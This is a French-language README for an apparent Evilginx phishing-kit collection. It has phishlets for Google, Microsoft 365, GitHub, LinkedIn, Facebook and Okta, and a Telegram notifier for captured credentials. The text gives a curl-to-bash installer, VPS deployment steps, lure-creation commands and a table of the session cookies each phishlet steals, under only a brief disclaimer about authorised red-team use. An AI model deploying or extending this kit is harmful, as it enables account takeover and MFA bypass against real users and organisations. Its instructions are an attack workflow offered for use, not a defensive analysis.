# 🎣 EVILGINX PRO - COLLECTION COMPLÈTE

## 📦 Contenu du Projet

**21 fichiers actifs + 3 archivés | 8000+ lignes de code/documentation** ✨

Cette collection complète vous permet de :

- ✅ **Déployer en 5 minutes** sur VPS avec installation automatique
- ✅ Déployer 7 phishlets pour différentes plateformes
- ✅ Recevoir des notifications Telegram en temps réel
- ✅ Créer vos propres phishlets avec l'analyseur automatique
- ✅ Comprendre la structure complète d'Evilginx Pro

---

## 📁 Structure du Projet

```
evilginx-pro-collection/
│
├── 📚 docs/                          # Documentation complète
│   ├── README-CODE-SOURCE.md         # Guide principal (commencez ici)
│   ├── INDEX-COMPLET.md              # Index de navigation
│   ├── GUIDE-STRUCTURE-PHISHLET.md   # Structure détaillée
│   ├── GUIDE-SELECTION-STRATEGIQUE.md # Guide stratégique
│   ├── GUIDE-TELEGRAM-NOTIFICATIONS.md # Intégration Telegram
│   ├── GUIDE-DEPLOIEMENT-VPS.md      # 🆕 Déploiement sur VPS (complet)
│   └── PHISHLETS-COLLECTION.md       # Collection des phishlets
│
├── 📋 DEPLOIEMENT-RAPIDE.md          # 🆕 Déploiement en 5 minutes
├── ✅ CHECKLIST-DEPLOIEMENT.md       # 🆕 Checklist imprimable
│
├── 🎯 phishlets/                     # Fichiers de configuration YAML
│   ├── google-simple.yaml            # Google (version simple)
│   ├── google-advanced.yaml          # Google (version complète)
│   ├── microsoft365.yaml             # Microsoft 365 / Azure AD
│   ├── github.yaml                   # GitHub
│   ├── linkedin.yaml                 # LinkedIn
│   ├── facebook.yaml                 # Facebook
│   └── okta.yaml                     # Okta SSO
│
├── 🛠️ scripts/                       # Scripts d'automatisation
│   ├── quick_deploy.sh               # 🆕 Installation automatique (1 commande)
│   ├── install_vps.sh                # Installation VPS standard
│   ├── telegram_notifier.py          # Notifications Telegram
│   ├── telegram_notifier.service     # Service systemd
│   ├── evilginx.service              # Service Evilginx systemd
│   └── phishlet_analyzer.py          # Analyseur de sites web (AMÉLIORÉ)
│
└── 📦 archive/                       # Fichiers alternatifs (non utilisés)
    ├── scripts-alternatifs/          # Scripts de notification alternatifs
    └── phishlets-alternatifs/        # Versions alternatives de phishlets
```

---

## 🚀 DÉPLOIEMENT SUR VPS

### Méthode 1 : Installation Automatique (Recommandée)

```bash
# Se connecter au VPS
ssh root@VOTRE_IP_VPS

# Télécharger et exécuter le script d'installation
curl -sSL https://raw.githubusercontent.com/afriklabprojet/evilginx-pro-collection/main/scripts/quick_deploy.sh | bash
```

**Ou installation manuelle :**

```bash
# Cloner le repository
cd /opt
git clone https://github.com/afriklabprojet/evilginx-pro-collection.git
cd evilginx-pro-collection

# Lancer l'installation
chmod +x scripts/install_vps.sh
bash scripts/install_vps.sh
```

### Méthode 2 : Depuis votre machine locale

```bash
# 1. Cloner le repository localement
git clone https://github.com/afriklabprojet/evilginx-pro-collection.git
cd evilginx-pro-collection

# 2. Copier vers le VPS
scp -r * root@VOTRE_IP_VPS:/opt/evilginx-pro-collection/

# 3. Se connecter et installer
ssh root@VOTRE_IP_VPS
cd /opt/evilginx-pro-collection
bash scripts/install_vps.sh
```

### 📖 Guide Complet de Déploiement

Pour une documentation détaillée avec :

- Configuration DNS
- Configuration Telegram
- Dépannage
- Sécurisation du VPS
- Monitoring

👉 **[Lire le guide complet](docs/GUIDE-DEPLOIEMENT-VPS.md)**

---

## 🚀 DÉMARRAGE RAPIDE

### 1. Lire la Documentation

```bash
# Commencer par le guide principal
cat docs/README-CODE-SOURCE.md

# Navigation complète
cat docs/INDEX-COMPLET.md
```

### 2. Tester un Phishlet

```bash
# Exemple avec Google
cd ~/evilginx-pro/
sudo ./evilginx -p ~/.evilginx/phishlets

# Dans Evilginx
phishlets hostname google your-domain.com
phishlets enable google
lures create google
lures get-url 0
```

### 3. Installer les Notifications Telegram

```bash
# Suivre le guide complet
cat docs/GUIDE-TELEGRAM-NOTIFICATIONS.md

# Installation rapide
sudo cp scripts/telegram_notifier.py /usr/local/bin/
sudo chmod +x /usr/local/bin/telegram_notifier.py

# Configurer
sudo nano /usr/local/bin/telegram_notifier.py
# → Modifier TELEGRAM_BOT_TOKEN et TELEGRAM_CHAT_ID

# Installer le service
sudo cp scripts/telegram_notifier.service /etc/systemd/system/
sudo systemctl enable telegram_notifier
sudo systemctl start telegram_notifier
```

---

## 📖 GUIDES DISPONIBLES

| Guide                               | Description                        | Lignes |
| ----------------------------------- | ---------------------------------- | ------ |
| **README-CODE-SOURCE.md**           | Vue d'ensemble et démarrage rapide | 354    |
| **GUIDE-STRUCTURE-PHISHLET.md**     | Structure détaillée des YAML       | 650+   |
| **GUIDE-TELEGRAM-NOTIFICATIONS.md** | Configuration Telegram complète    | 800+   |
| **PHISHLETS-COLLECTION.md**         | Tous les phishlets disponibles     | 450+   |
| **GUIDE-SELECTION-STRATEGIQUE.md**  | Stratégie red team                 | 450+   |
| **INDEX-COMPLET.md**                | Navigation et index                | 500+   |

---

## 🎯 PHISHLETS DISPONIBLES

| Plateforme        | Fichier                | Tokens Capturés              | Difficulté           |
| ----------------- | ---------------------- | ---------------------------- | -------------------- |
| **Google**        | `google-simple.yaml`   | SID, LSID, SSID              | ⭐⭐ Moyenne         |
| **Google**        | `google-advanced.yaml` | Version complète             | ⭐⭐⭐⭐ Très élevée |
| **Microsoft 365** | `microsoft365.yaml`    | ESTSAUTH, ESTSAUTHPERSISTENT | ⭐⭐⭐ Élevée        |
| **GitHub**        | `github.yaml`          | user_session, logged_in      | ⭐⭐ Moyenne         |
| **LinkedIn**      | `linkedin.yaml`        | li_at, JSESSIONID            | ⭐⭐⭐⭐ Très élevée |
| **Facebook**      | `facebook.yaml`        | c_user, xs, datr             | ⭐⭐⭐⭐⭐ Extrême   |
| **Okta**          | `okta.yaml`            | sid, DT (multi-tenant)       | ⭐⭐⭐ Élevée        |

> 📦 **Note** : Versions alternatives disponibles dans `archive/phishlets-alternatifs/`

---

## 🔔 FONCTIONNALITÉS TELEGRAM

Le script `telegram_notifier.py` vous permet de recevoir :

- 📧 **Credentials** : Email/password capturés
- 🍪 **Cookies** : Sessions valides
- 🌐 **Source** : IP, User-Agent, pays
- ⏱️ **Timestamp** : Date et heure de capture
- 🎯 **Phishlet** : Plateforme ciblée

**Format de notification** :

```
🎯 NOUVELLE SESSION CAPTURÉE 📧

📋 Informations
├─ Phishlet: google
├─ Session ID: #42
└─ Timestamp: 2025-12-25 14:30:45

👤 Credentials
├─ Username: victim@company.com
└─ Password: P@ssw0rdSecure123

🍪 Cookies: 8 cookies capturés
🌐 IP: 203.0.113.45
```

---

## 🛠️ SCRIPTS D'AUTOMATISATION

### quick_deploy.sh (🆕 NOUVEAU)

**Installation automatique en 1 commande**

- Déploiement complet en 5-10 minutes
- Détection automatique de l'OS
- Configuration du pare-feu
- Installation de tous les composants
- Résumé post-installation détaillé

### telegram_notifier.py

**Surveillance automatique de la base de données Evilginx**

- Vérifie `sessions.db` toutes les 10 secondes
- Envoie une notification Telegram pour chaque nouvelle session
- Évite les doublons avec système d'état
- Service systemd pour démarrage automatique

### phishlet_analyzer.py (✨ AMÉLIORÉ)

**Analyse automatique de sites web avec détection intelligente**

- ✅ Détecte automatiquement les champs username/password
- ✅ Extrait les URLs du flow d'authentification
- ✅ Identifie les URLs de landing (dashboard, home, etc.)
- ✅ Analyse les cookies et domaines
- ✅ Génère un template YAML complet et commenté
- ✅ Plus de TODOs manuels - détection intelligente intégrée

### install_vps.sh

**Installation complète sur VPS**

- Installation d'Evilginx2, Go, dépendances
- Configuration des phishlets
- Installation des services systemd
- Configuration Telegram automatique

> 📦 **Scripts alternatifs** disponibles dans `archive/scripts-alternatifs/`  
> (webhook notifier, alternative Telegram, etc.)

---

## ⚠️ AVERTISSEMENT LÉGAL

**Ces outils sont destinés UNIQUEMENT à :**

- ✅ Tests de sécurité autorisés
- ✅ Exercices red team avec autorisation écrite
- ✅ Formation en cybersécurité
- ✅ Recherche en sécurité

**Utilisation illégale strictement interdite**

---

## 📚 RESSOURCES

- **Documentation Officielle** : https://help.evilginx.com
- **GitHub** : https://github.com/kgretzky/evilginx2
- **Community** : https://evilginx.com

---

## 🎓 SUPPORT

Pour toute question :

1. Consulter `docs/INDEX-COMPLET.md`
2. Lire les guides spécifiques
3. Vérifier le troubleshooting dans chaque guide

---

**🎣 Bonne utilisation et tests de sécurité responsables !**

_Collection créée le 25 décembre 2025_  
_Compatible Evilginx Pro 3.0+_
